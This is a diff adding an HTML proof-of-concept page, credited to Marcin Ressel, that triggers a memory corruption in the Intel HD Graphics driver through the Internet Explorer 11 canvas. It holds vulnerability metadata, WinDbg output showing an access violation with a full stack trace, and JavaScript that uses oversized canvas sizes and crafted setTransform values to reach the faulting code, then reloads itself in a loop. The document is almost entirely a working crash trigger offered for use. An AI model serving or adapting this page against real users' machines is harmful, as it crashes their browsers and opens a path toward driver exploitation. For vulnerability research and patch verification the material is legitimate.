@@ -1,0 +1,211 @@
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta http-equiv="Expires" content="0" />
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+  <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  </head>
+<body>
+<!--
+#   Intel HD Graphics Drivers for Windows (IE11) Memory Corruption
+#   ( Właściwie to prawdopodobnie NULL pointer z potencjałem, cholernie wkurwiający w analizie )
+#   Version : Intel 20.19.15.4549
+#             MS Internet Explorer 11.472.17134.0 (va : 11.0.101)
+#			  Microsoft Windows 10 Home 10.0.17134 N/A Build 17134 (full pathed)
+#             Intel(R) HD Graphics 4600 v20.19.15.4549 (full pathed)
+#   Time: (Discovered) 14/10/2018 
+#   Tested on : Windows 10 Home x64, Windows 10 Enterprise x64
+#   Software Link : n/a
+#   Author : Marcin Ressel
+#   Vendor Homepage : www.intel.com
+########################################################################################
+
+lmDvmigd10iumd32
+Browse full module list
+start    end        module name
+66400000 67032000   igd10iumd32   (export symbols)       C:\WINDOWS\SYSTEM32\igd10iumd32.dll
+    Loaded symbol image file: C:\WINDOWS\SYSTEM32\igd10iumd32.dll
+    Image path: C:\WINDOWS\SYSTEM32\igd10iumd32.dll
+    Image name: igd10iumd32.dll
+    Browse all global symbols  functions  data
+    Timestamp:        Thu Nov 10 17:54:26 2016 (582524D2)
+    CheckSum:         00C7E951
+    ImageSize:        00C32000
+    File version:     20.19.15.4549
+    Product version:  20.19.15.4549
+    File flags:       0 (Mask 3F)
+    File OS:          40004 NT Win32
+    File type:        2.8 Dll
+    File date:        00000000.00000000
+    Translations:     0409.04b0
+    Information from resource tables:
+        CompanyName:      Intel Corporation
+        ProductName:      Intel HD Graphics Drivers for Windows(R)
+        InternalName:     igd10iumd32.dll
+        OriginalFilename: igd10iumd32.dll
+        ProductVersion:   20.19.15.4549
+        FileVersion:      20.19.15.4549
+        FileDescription:  User Mode Driver for Intel(R) Graphics Technology
+        LegalCopyright:   Copyright (c) 1998-2014 Intel Corporation.
+##################################################################################################
+# ʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘ
+#
+# 
+#
+# ʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘʘ
+##################################################################################################
+0:010> g
+WARNING: Continuing a non-continuable exception
+(14f0.28e8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=000113e8 ebx=00000000 ecx=000113dc edx=000113dc esi=24a31640 edi=24a31640
+eip=663bfa58 esp=0c7bb204 ebp=0c7bb218 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+igd10iumd32!OpenAdapter10_2+0x321958:
+663bfa58 8b02            mov     eax,dword ptr [edx]  ds:002b:000113dc=????????
+0:010> kb
+ # ChildEBP RetAddr  Args to Child              
+WARNING: Stack unwind information not available. Following frames may be wrong.
+00 0c7bb218 6d018375 24a31640 00000000 6cfc6280 igd10iumd32!OpenAdapter10_2+0x321958
+01 0c7bb25c 6d00bafd 00000001 24a2ab40 00000000 d3d11!CContext::EmptyOutAllDDIBindPoints+0x5445f
+02 0c7bb274 6cfbb986 00000000 0c7bb30c 24a2ab40 d3d11!CContext::CompleteContextRemoval+0x47c0a
+03 0c7bb2d4 6d0e62c1 00000000 2d051a2c 24a2ab40 d3d11!TOptImmediateContext::AcquireDevCtxIfaceNoSync+0xb6
+04 0c7bb2f0 6d0e6174 24a2ab40 00000000 2d051a2c d3d11!CDevCtxInterfaceForResourceUpdates::CDevCtxInterfaceForResourceUpdates<CContext>+0x84
+05 0c7bb324 6939fb56 24a2abb0 28dc8c24 00000000 d3d11!CContext::TID3D11DeviceContext_UpdateSubresource_Amortized<1>+0x34
+06 0c7bb350 6932e4a0 24a2abb0 28dc8c24 17a54b90 d2d1!SimplifiedConstantBufferTable::SendState+0x38
+07 0c7bb3c0 692c3e33 00000000 0000000f 0c7bb578 d2d1!GeometryStageManager::Flush+0xadae7
+08 0c7bb550 6939f599 00000010 bf800000 17a54b90 d2d1!CHwSurfaceRenderTarget::FlushQueuedOperations+0x173
+09 0c7bb5d0 693971b5 17a54b90 2d0512f8 29442e80 d2d1!StageManagerBase::AllocateHeapRect+0xb2
+0a 0c7bb6a4 6938e0ee 17a54b90 0c7bbff8 00000000 d2d1!GeometryStageManager::BeginDraw+0xdb
+0b 0c7bb748 6933f89b 0c7bbff8 74bb23dd 0c7bb778 d2d1!CHwSurfaceRenderTarget::FillTessellation_TIR+0x170
+0c 0c7bc05c 692c97ec 00000000 244d3ec0 0c7bc088 d2d1!CHwSurfaceRenderTarget::FillShapeData+0x792d6
+0d 0c7bc0e4 69279ad1 244d3eac 0c7bc22c 0c7bc25c d2d1!CHwSurfaceRenderTarget::FillPath+0x9c
+0e 0c7bc118 69277765 00000007 0c7bc25c 69276ea0 d2d1!PopLayerDrawCallHelper::PopLayerInversePathOp+0x6d
+0f 0c7bc340 69276b5a 17a54b90 00000000 1f521f8c d2d1!LayerSubTarget::PopInternal+0x8c5
+10 0c7bc364 692954a5 74bb23dd 00000000 1f521f8c d2d1!RTSubTargetState::Pop+0xdb
+11 0c7bc37c 69294f01 17a54b90 00000000 1f521f8c d2d1!CBaseRenderTarget::Pop+0x19
+12 0c7bc390 692f60e5 00000000 1f521f8c 22190c08 d2d1!CBaseRenderTarget::PopLayer+0x11
+13 0c7bc3ac 692c43a8 17a54b90 17a54b90 2d053138 d2d1!CCommand_PopLayer::Execute+0x35
+14 0c7bc3cc 692c455e 2218efd0 692c4460 17a54b94 d2d1!CHwSurfaceRenderTarget::ProcessBatchImpl+0x73
+15 0c7bc3f8 692b8cab 00000003 2218efd0 0c7bc42c d2d1!CHwSurfaceRenderTarget::ProcessBatch+0xfe
+16 0c7bc44c 692b3bc8 00000003 17a56de0 17a56dd0 d2d1!CBatchSerializer::FlushInternal+0x13b
+17 0c7bc488 692b3055 00000003 0c7bc4b0 0c7bc4c0 d2d1!DrawingContext::Flush+0x92
+18 0c7bc4d8 6926b724 0c7bc5a4 0c7bc5ac 0c7bc59c d2d1!DrawingContext::EndDraw+0x13c
+19 0c7bc588 69e7202c 17a56dd0 0c7bc5a4 0c7bc5ac d2d1!D2DDeviceContextBase<ID2D1DeviceContext6,ID2D1DeviceContext6,null_type>::EndDraw+0x144
+1a 0c7bc5b4 69e71fa3 233f4ee0 233f4ee0 234a8fe0 MSHTML!CDXRenderTarget::EndDrawD2D+0x48
+1b 0c7bc5cc 69fec3a4 00000000 0c7bc638 233f4ee0 MSHTML!CDXRenderTarget::SetTargetInfo+0x23
+1c 0c7bc5e8 69fec349 0c7bc638 233f4ee0 233f4ee0 MSHTML!CDXTargetSurface::ReleaseResources+0x29
+1d 0c7bc610 69fec444 0c7bc638 233f4ee0 0b326fd0 MSHTML!CDXRenderTarget::ReleaseResources+0x49
+1e 0c7bc620 69ff992b 69ff9900 0c7bc654 6a15efc0 MSHTML!CDXRenderTarget::~CDXRenderTarget+0x12
+1f 0c7bc62c 6a15efc0 233f4ee0 0c7bc644 6a170280 MSHTML!RefCounted<CDXTextureRenderTarget,MultiThreadedRefCount>::Release+0x2b
+20 0c7bc63c 69fbb4aa 0c7bc66c 0b326fd0 0b326fd0 MSHTML!TSmartPointer<ID2D1Bitmap>::~TSmartPointer<ID2D1Bitmap>+0x20
+21 0c7bc654 6a16e420 0c7bc66c 69f67e70 0b326fd0 MSHTML!CHTMLCanvasElement::ResetRenderingSurfaces+0x2c
+22 0c7bc664 6a9452f3 0c7bc698 69581aa8 0b326fd0 MSHTML!CHTMLCanvasElement::ResetState+0xc
+23 0c7bc68c 6a945705 00000000 00000002 1f6c2de0 MSHTML!CHTMLCanvasElement::SetWidthHelper+0x44
+24 0c7bc6a8 6a74c08c 1f6c2de0 0c7bc6e0 1f6c2de0 MSHTML!CHTMLCanvasElement::Var_set_width+0x42
+25 0c7bc6d0 6971c280 1f7bff90 02000002 1f32b8a0 MSHTML!CFastDOM::CHTMLCanvasElement::Trampoline_Set_width+0x3c
+26 0c7bc73c 696d8c1f 1f7bff90 02000002 1f32b8a0 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x190
+27 0c7bc768 696bd0d6 e53a3b24 0c7bc7b8 0c7bc7dc jscript9!<lambda_58b9ba9eeb8f97b5e624add39c5039e7>::operator()+0xa0
+28 0c7bc794 696e3a5b 1f7bff90 00000000 2545b8b8 jscript9!ThreadContext::ExecuteImplicitCall<<lambda_58b9ba9eeb8f97b5e624add39c5039e7> >+0x73
+29 0c7bc7e0 696618dc 00000001 2545b8b8 16729342 jscript9!Js::JavascriptOperators::CallSetter+0x4b
+2a 0c7bc800 69666f75 1f32b8a0 0c7bc9f4 00000001 jscript9!Js::InlineCache::TrySetProperty<1,1,1,1,0>+0x10c
+2b 0c7bca58 696465c5 16729348 1f316000 16729000 jscript9!Js::InterpreterStackFrame::Process+0x1b85
+2c 0c7bcbec 1f790fe9 0c7bcc00 0c7bcc38 6971a303 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x205
+2d 0c7bcbf8 6971a303 16ac40a0 00000000 0c7bcc70 0x1f790fe9
+2e 0c7bcc38 696ae43f 00000000 00000000 e53a301c jscript9!Js::JavascriptFunction::CallFunction<1>+0x93
+2f 0c7bccac 696ae305 2545b8b8 00000000 00000000 jscript9!Js::JavascriptFunction::CallRootFunctionInternal+0xb5
+30 0c7bcd04 696fc823 2545b8b8 00000000 00000000 jscript9!Js::JavascriptFunction::CallRootFunction+0x4d
+31 0c7bcd4c 6963abca 0c7bcd74 00000000 00000000 jscript9!ScriptSite::CallRootFunction+0x42
+32 0c7bcd88 6963ed06 16ac40a0 0c7bcdcc 00000000 jscript9!ScriptSite::Execute+0xcc
+33 0c7bce20 6963fba8 0c7bd098 0c7bd06c e53a3208 jscript9!ScriptEngine::ExecutePendingScripts+0x1c6
+34 0c7bceb8 6963fcfa 23868694 1ab34fec 0b377d24 jscript9!ScriptEngine::ParseScriptTextCore+0x345
+35 0c7bcf08 6a072001 1f6c2e00 23868694 1ab34fec jscript9!ScriptEngine::ParseScriptText+0x5a
+36 0c7bcf40 6a071fa3 23868694 00000000 00000000 MSHTML!CActiveScriptHolder::ParseScriptText+0x51
+37 0c7bcf98 6a06f0f0 23868694 00000000 00000000 MSHTML!CJScript9Holder::ParseScriptText+0x63
+38 0c7bd008 6a06cce1 00000000 0b30ec00 00000000 MSHTML!CScriptCollection::ParseScriptText+0x17d
+39 0c7bd0f4 6a06e160 00000000 00000000 00000000 MSHTML!CScriptData::CommitCode+0x2e5
+3a 0c7bd174 6a06dbdb 0b3aa8a0 8000ffff 2092e540 MSHTML!CScriptData::Execute+0x241
+3b 0c7bd194 6a10ba3c 00000002 8000ffff 0b3ab620 MSHTML!CHtmScriptParseCtx::Execute+0xeb
+3c 0c7bd1e8 6a036cd2 026d44ec 0b3ab620 00030280 MSHTML!CHtmParseBase::Execute+0x20c
+3d 0c7bd204 6a036545 00000002 2092e540 6a0e6770 MSHTML!CHtmPost::Broadcast+0xc2
+3e 0c7bd32c 6a0e66e5 026d45a4 0b2d0000 0b3ab620 MSHTML!CHtmPost::Exec+0x1b5
+3f 0c7bd34c 6a0e65e0 026d45a4 0b3ab620 0b2d0000 MSHTML!CHtmPost::Run+0x3d
+40 0c7bd36c 6a0e64c4 0b3ab620 0b3ab620 69c9e3e8 MSHTML!PostManExecute+0x60
+41 0c7bd380 6a0e6219 6a0e61e0 0c7bd3c0 0b2d0000 MSHTML!PostManResume+0x79
+42 0c7bd3b0 6a071f2e 0b2f9480 0b3ab620 0c7bd3d8 MSHTML!CHtmPost::OnDwnChanCallback+0x39
+43 0c7bd3c8 6a10c18b 0b2f9480 00000000 0000000c MSHTML!CDwnChan::OnMethodCall+0x3e
+44 0c7bd444 6a10c524 920d601d 00008002 00000000 MSHTML!GlobalWndOnMethodCall+0x21b
+45 0c7bd490 74cbbf1b 001004c4 00008002 00000000 MSHTML!GlobalWndProc+0xe4
+46 0c7bd4bc 74cb83ea 6a10c440 001004c4 00008002 USER32!_InternalCallWinProc+0x2b
+47 0c7bd5a4 74cb7c9e 6a10c440 00000000 00008002 USER32!UserCallWinProcCheckWow+0x3aa
+48 0c7bd620 74cb7a80 004442fa 0c7bf7b8 6b0a648f USER32!DispatchMessageWorker+0x20e
+49 0c7bd62c 6b0a648f 0c7bd668 09ef9d88 0c824fc8 USER32!DispatchMessageW+0x10
+4a 0c7bf7b8 6b0a5a90 0c7bf884 6b0a5680 09efbff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x46f
+4b 0c7bf878 6aecb61c 09ef9d88 0c7bf89c 6b0e5610 IEFRAME!LCIETab_ThreadProc+0x410
+4c 0c7bf890 6719e6cd 09efbff0 6719e640 6719e640 msIso!_IsoThreadProc_WrapperToReleaseScope+0x1c
+4d 0c7bf8c8 74068484 0c533fe8 74068460 be253702 IEShims!NS_CreateThread::AutomationIE_ThreadProc+0x8d
+4e 0c7bf8dc 77513ab8 0c533fe8 8526519f 00000000 KERNEL32!BaseThreadInitThunk+0x24
+4f 0c7bf924 77513a88 ffffffff 7752f306 00000000 ntdll!__RtlUserThreadStart+0x2f
+50 0c7bf934 00000000 6719e640 0c533fe8 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+-->
+<div id='out'> </div>
+<img/>
+<script>
+
+var canvas = document.createElement('canvas');
+    canvas.id = "canvas";
+    canvas.width = 3;
+    canvas.height = 3;
+
+document.getElementsByTagName("body")[0].appendChild(canvas);
+
+var ctx = canvas.getContext('2d');
+
+ctx.clip("nonzero"); 
+
+var vCanvas = document.getElementById('canvas'); 
+
+ctx.stroke();
+
+vCanvas.width = 536870912; 
+
+ctx.fill("nonzero"); 
+
+ctx.stroke(); 
+
+ctx.beginPath(); 
+
+ctx.clip("nonzero"); 
+
+//4294967295, 536870912, 0, 268435456, 1073741824,  1073741824
+//536870911, 1073741824, -1, 32768, 2147483648,  -1073741824
+//ctx.setTransform(536870911, 1073741824, 1, 2, 3, -32769);  //69856 = 000110e0, 69872 = 000110f0, 69936 = 00011130, 70228 = 00011254,  70620 = 000113dc												   
+ctx.setTransform(500000000, 1003741824, 1, 0, 0, -72769);
+														  														   
+
+ctx.arc(191, 320, 199, 140, 138); 
+
+vCanvas.width = 1073741824; 
+
+ctx.fill("evenodd"); 
+
+ctx.arc(239, 147, 47, 221, 165); 
+
+vCanvas.height = 1073741824; 
+
+ctx.clip("nonzero"); 
+
+ctx.stroke();
+
+ctx.stroke(); 
+
+vCanvas.width = 20;
+
+setTimeout('location.reload();',100);
+
+</script>
+</body>
+</html>
